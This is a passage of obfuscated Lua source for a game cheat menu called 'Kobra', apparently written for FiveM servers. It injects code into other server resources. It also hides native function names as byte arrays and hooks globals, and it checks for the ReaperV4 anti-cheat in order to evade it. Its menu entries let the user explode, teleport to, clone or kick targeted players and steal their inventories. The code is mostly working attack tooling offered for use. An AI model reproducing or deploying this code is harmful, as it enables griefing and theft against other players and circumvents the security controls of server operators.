                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v401));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1 + 0 ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v402) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v402));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v403=1522 -(251 + 1271) ;local v404;while true do if ((0 + 0)==v403) then v404=nil;for v797,v798 in pairs(v27) do if v798 then v404=v797;break;end end v403=2 -1 ;end if (v403==(2 -1)) then if v404 then local v884=0 -0 ;local v885;local v886;local v887;local v888;while true do if (v884==2) then v888=GetEntityHeading(v886);SetEntityCoords(PlayerPedId(),v887.x,v887.y,v887.z,false,false,false,false);v884=3;end if (v884==(1262 -(1147 + 112))) then SetEntityHeading(PlayerPedId(),v888);v281:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v404)),v404),3000);break;end if (v884==(1 + 0)) then v886=GetPlayerPed(v885);v887=GetEntityCoords(v886);v884=3 -1 ;end if (v884==(0 + 0)) then v885=GetPlayerFromServerId(v404);if ((v885== -1) or  not DoesEntityExist(GetPlayerPed(v885))) then local v1239=697 -(335 + 362) ;while true do if (v1239==1) then v12:UpdateListMenu();return;end if (v1239==(0 + 0)) then v281:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",4516 -1516 );v27[v404]=nil;v1239=2 -1 ;end end end v884=3 -2 ;end end else v281:Notify("error","Kobra","You must select a player to do this!",3000);end break;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v405) local v406=0 -0 ;local v407;while true do if ((567 -(237 + 329))==v406) then v281:HandleSpectateToggle(v407,v405);break;end if (v406==0) then v407=nil;for v799,v800 in pairs(v27) do if v800 then v407=v799;break;end end v406=1;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v408={};for v546,v547 in pairs(v27) do if v547 then v408[ #v408 + 1 + 0 ]=v546;end end if ( #v408==(0 + 0)) then local v601=1124 -(408 + 716) ;while true do if (v601==0) then v281:Notify("error","Kobra","You must select a player to do this!",11398 -8398 );return;end end end local v409=v408[822 -(344 + 477) ];local v410=GetResourceState("ReaperV4")=="started" ;if v410 then MachoInjectThread(0 + 0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v409));else local v602=1761 -(1188 + 573) ;local v603;local v604;local v605;local v606;local v607;while true do if (v602==(7 -4)) then function v607(v986) local v987=0;local v988;local v989;local v990;while true do if (v987==2) then if (v605(v603("DoesEntityExist"))(v989) and v605(v603("DoesEntityExist"))(v990)) then local v1286=0;while true do if (v1286==(1 + 0)) then v605(v603("SetPedComponentVariation"))(v990,19 -13 ,v605(v603("GetPedDrawableVariation"))(v989,8 -2 ),v605(v603("GetPedTextureVariation"))(v989,14 -8 ),1529 -(508 + 1021) );v605(v603("SetPedComponentVariation"))(v990,8,v605(v603("GetPedDrawableVariation"))(v989,8 + 0 ),v605(v603("GetPedTextureVariation"))(v989,8),1166 -(228 + 938) );v605(v603("SetPedComponentVariation"))(v990,696 -(332 + 353) ,v605(v603("GetPedDrawableVariation"))(v989,13 -2 ),v605(v603("GetPedTextureVariation"))(v989,11),0 -0 );v605(v603("SetPedPropIndex"))(v990,0 + 0 ,v605(v603("GetPedPropIndex"))(v989,0 + 0 ),v605(v603("GetPedPropTextureIndex"))(v989,0),true);v1286=7 -5 ;end if (v1286==(425 -(18 + 405))) then v605(v603("SetPedPropIndex"))(v990,1 + 0 ,v605(v603("GetPedPropIndex"))(v989,1 + 0 ),v605(v603("GetPedPropTextureIndex"))(v989,1 -0 ),true);v605(v603("SetPedPropIndex"))(v990,980 -(194 + 784) ,v605(v603("GetPedPropIndex"))(v989,1772 -(694 + 1076) ),v605(v603("GetPedPropTextureIndex"))(v989,1906 -(122 + 1782) ),true);print("^2[Kobra] Clothing copied successfully!^0");break;end if (v1286==(0 + 0)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v986   .. "^0" );v605(v603("SetPedComponentVariation"))(v990,1,v605(v603("GetPedDrawableVariation"))(v989,1 + 0 ),v605(v603("GetPedTextureVariation"))(v989,1 + 0 ),0 + 0 );v605(v603("SetPedComponentVariation"))(v990,8 -5 ,v605(v603("GetPedDrawableVariation"))(v989,3 + 0 ),v605(v603("GetPedTextureVariation"))(v989,3),0);v605(v603("SetPedComponentVariation"))(v990,1974 -(214 + 1756) ,v605(v603("GetPedDrawableVariation"))(v989,19 -15 ),v605(v603("GetPedTextureVariation"))(v989,4),0 + 0 );v1286=1 + 0 ;end end else print("^3[WARNING] Target or local ped does not exist.^0");end break;end if (v987==0) then v988=v606(v986);if (v988== -(586 -(217 + 368))) then local v1287=0 -0 ;while true do if (v1287==(0 + 0)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v986   .. "^0" );return;end end end v987=1 + 0 ;end if (v987==1) then v989=v605(v603("GetPlayerPed"))(v988);v990=v605(v603("PlayerPedId"))();v987=1 + 1 ;end end end v607(v409);break;end if ((889 -(844 + 45))==v602) then v603=nil;function v603(v991) local v992={};for v1041=285 -(242 + 42) , #v991 do v992[v1041]=string.byte(v991,v1041);end return v992;end v604=nil;v602=1;end if (v602==1) then function v604(v993) local v994=0 -0 ;local v995;while true do if (v994==(0 -0)) then v995="";for v1240=1201 -(132 + 1068) , #v993 do v995=v995   .. string.char(v993[v1240]) ;end v994=1 -0 ;end if (v994==(1624 -(214 + 1409))) then return v995;end end end v605=nil;function v605(v996) local v997=v604(v996);local v998=_G[v997];return v998;end v602=2 + 0 ;end if (v602==2) then v606=nil;function v606(v999) local v1000=0;local v1001;while true do if (v1000==(1634 -(497 + 1137))) then v1001=v605(v603("GetActivePlayers"))();for v1241,v1242 in ipairs(v1001) do if (v605(v603("GetPlayerServerId"))(v1242)==v999) then return v1242;end end v1000=941 -(9 + 931) ;end if (v1000==(290 -(181 + 108))) then return  -1;end end end v607=nil;v602=2 + 1 ;end end end v281:Notify("success","Kobra","Copied clothing!",12330 -7330 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v411={};for v548,v549 in pairs(v27) do if v549 then v411[ #v411 + 1 ]=v548;end end if ( #v411==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",1871 + 1129 );return;end v281:HandleLaunchPlayer(v411);v281:Notify("success","Kobra","Attempting to TEST",5476 -(296 + 180) );end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v412={};for v550,v551 in pairs(v27) do if v551 then v412[ #v412 + (1266 -(1037 + 228)) ]=v550;end end if ( #v412==(0 -0)) then local v608=0 -0 ;while true do if (v608==0) then v281:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end for v552,v553 in ipairs(v412) do local v554=0 -0 ;local v555;local v556;while true do if ((735 -(527 + 207))==v554) then if ((v556== -1) or  not DoesEntityExist(GetPlayerPed(v556))) then local v1002=527 -(187 + 340) ;while true do if (v1002==(1871 -(1298 + 572))) then return;end if (v1002==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",3170 -(144 + 26) );v27[v553]=nil;v1002=2 -1 ;end end else local v1003=0 -0 ;local v1004;while true do if (v1003==0) then v1004=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v555)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v1004,v555);v1003=1 + 0 ;end if (v1003==1) then v281:Notify("success","Kobra","Attempting to Explode Player",5000);break;end end end break;end if (0==v554) then v555=v553;v556=GetPlayerFromServerId(v553);v554=2 -1 ;end end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v413=0;local v414;while true do if (v413==(4 -3)) then if ( #v414==0) then local v889=0;while true do if (v889==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",4071 -1071 );return;end end end v281:HandleTakeInventory(v414);v413=2;end if (v413==(0 + 0)) then v414={};for v801,v802 in pairs(v27) do if v802 then v414[ #v414 + 1 + 0 ]=v801;end end v413=203 -(5 + 197) ;end if (v413==2) then v281:Notify("success","Kobra","Attempting to steal inventory",5686 -(339 + 347) );break;end end end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v415={};for v557,v558 in pairs(v27) do if v558 then v415[ #v415 + (3 -2) ]=v557;end end if ( #v415==(376 -(365 + 11))) then v281:Notify("error","Kobra","You must select a player to do this!",2843 + 157 );return;end v281:HandleClonePlayer(v415);v281:Notify("success","Kobra","Cloned Player",19230 -14230 );end},{type="button",label="Attack Clone Player",onSelect=function() local v416=0 -0 ;local v417;while true do if ((926 -(837 + 87))==v416) then v281:Notify("success","Kobra","Cloned Player",8478 -3478 );break;end if (v416==(1671 -(837 + 833))) then if ( #v417==0) then local v890=0;while true do if (v890==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",4387 -(356 + 1031) );return;end end end v281:HandleAttackClonePlayer(v417);v416=2;end if (v416==(0 + 0)) then v417={};for v803,v804 in pairs(v27) do if v804 then v417[ #v417 + (1647 -(73 + 1573)) ]=v803;end end v416=1389 -(1307 + 81) ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1 -0 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v418) local v419=0;local v420;while true do if (v419==0) then v420={};for v805,v806 in pairs(v27) do if v806 then v420[ #v420 + 1 ]=v805;end end v419=1276 -(155 + 1120) ;end if (v419==(1507 -(396 + 1110))) then if ( #v420==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",978 + 2022 );return;end v12:AttachSelectedVehicle(v420,v418);v419=2 + 0 ;end if (v419==(2 + 0)) then v281:Notify("success","Kobra","Vehicle Attached to "   ..  #v420   .. " Player(s)" ,5976 -(230 + 746) );break;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=267 -(38 + 228) ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v421) local v422={};for v559,v560 in pairs(v27) do if v560 then v422[ #v422 + 1 ]=v559;end end if ( #v422==0) then local v609=0;while true do if (v609==(1635 -(1568 + 67))) then v281:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v561) return v421;end;v12:SpawnSelectedObject(v422);end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1 + 0 ,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v424) local v425={};for v562,v563 in pairs(v27) do if v563 then v425[ #v425 + 1 ]=v562;end end if ( #v425==(0 -0)) then local v610=0;while true do if (v610==(0 -0)) then v281:Notify("error","Kobra","You must select at least one player!",8607 -5607 );return;end end end v12.GetSelectedObjectModel=function(v564) return v424;end;v12:SpawnSelectedObject(v425);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v424)   .. "' for "   ..  #v425   .. " player(s)." ,2924 + 2076 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=912 -(98 + 813) ,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v427) local v428={};for v565,v566 in pairs(v27) do if v566 then v428[ #v428 + (1912 -(1680 + 231)) ]=v565;end end if ( #v428==(0 + 0)) then local v611=0 + 0 ;while true do if (v611==(1149 -(212 + 937))) then v281:Notify("error","Kobra","You must select at least one player!",1999 + 1001 );return;end end end v12.GetSelectedObjectModel=function(v567) return v427;end;v12:SpawnSelectedObject(v428);end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1063 -(111 + 951) ,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v430) local v431={};for v568,v569 in pairs(v27) do if v569 then v431[ #v431 + (1445 -(189 + 1255)) ]=v568;end end if ( #v431==(0 + 0)) then local v612=0 -0 ;while true do if (v612==(1279 -(1170 + 109))) then v281:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v570) return v430;end;v12:SpawnSelectedObject(v431);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v430)   .. "' for "   ..  #v431   .. " player(s)." ,6817 -(348 + 1469) );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v433=1014 -(85 + 929) ;local v434;while true do if (v433==(1 + 0)) then if v434 then local v891=GetPlayerFromServerId(v434);if (v891== -(1868 -(1151 + 716))) then local v1043=0;while true do if (v1043==(1 + 0)) then v12:UpdateListMenu();return;end if (v1043==0) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",2928 + 72 );v27[v434]=nil;v1043=1705 -(95 + 1609) ;end end end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v891))) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",10828 -7828 );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1131=759 -(364 + 394) ,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
